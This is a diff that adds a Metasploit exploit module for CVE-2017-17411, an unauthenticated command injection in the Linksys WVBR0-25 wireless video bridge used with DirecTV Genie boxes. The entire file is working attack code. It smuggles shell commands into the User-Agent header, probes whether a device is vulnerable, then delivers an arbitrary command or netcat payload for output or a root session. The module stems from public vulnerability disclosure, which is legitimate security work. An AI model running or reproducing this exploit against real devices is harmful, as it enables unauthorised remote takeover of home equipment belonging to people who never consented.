@@ -1,0 +1,118 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Linksys WVBR0-25 User-Agent Command Execution',
+      'Description' => %q{
+        The Linksys WVBR0-25 Wireless Video Bridge, used by DirecTV to connect wireless Genie
+        cable boxes to the Genie DVR, is vulnerable to OS command injection in version < 1.0.41
+        of the web management portal via the User-Agent header. Authentication is not required to
+        exploit this vulnerability.
+      },
+      'Author'      =>
+        [
+          'HeadlessZeke' # Vulnerability discovery and Metasploit module
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          ['CVE', '2017-17411'],
+          ['ZDI', '17-973'],
+          ['URL', 'https://www.thezdi.com/blog/2017/12/13/remote-root-in-directvs-wireless-video-bridge-a-tale-of-rage-and-despair']
+        ],
+      'DisclosureDate' => 'Dec 13 2017',
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+          'Space'       => 1024,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic netcat'
+            }
+        },
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Targets'        => [[ 'Automatic', { }]],
+      'DefaultTarget'  => 0
+      ))
+  end
+
+  def check
+    check_str = rand_text_alpha(8)
+    begin
+      res = send_request_raw({
+        'method' => 'GET',
+        'uri' => '/',
+        'agent' => "\"; printf \"#{check_str}"
+      })
+      if res && res.code == 200 && res.body.to_s.include?(Rex::Text.md5(check_str))
+        return Exploit::CheckCode::Vulnerable
+      end
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    print_status("#{peer} - Trying to access the device ...")
+
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Failure::NotVulnerable, "#{peer} - Failed to access the vulnerable device")
+    end
+
+    print_status("#{peer} - Exploiting...")
+
+    if datastore['PAYLOAD'] == 'cmd/unix/generic'
+      exploit_cmd
+    else
+      exploit_session
+    end
+  end
+
+  def exploit_cmd
+    beg_boundary = rand_text_alpha(8)
+
+    begin
+      res = send_request_raw({
+        'method' => 'GET',
+        'uri'    => '/',
+        'agent' => "\"; echo #{beg_boundary}; #{payload.encoded} #"
+      })
+
+      if res && res.code == 200 && res.body.to_s =~ /#{beg_boundary}/
+        print_good("#{peer} - Command sent successfully")
+        if res.body.to_s =~ /ret :.+?#{beg_boundary}(.*)/  # all output ends up on one line
+          print_status("#{peer} - Command output: #{$1}")
+        end
+      else
+        fail_with(Failure::UnexpectedReply, "#{peer} - Command execution failed")
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+
+  def exploit_session
+    begin
+      send_request_raw({
+        'method' => 'GET',
+        'uri'    => '/',
+        'agent' => "\"; #{payload.encoded} #"
+      })
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+end
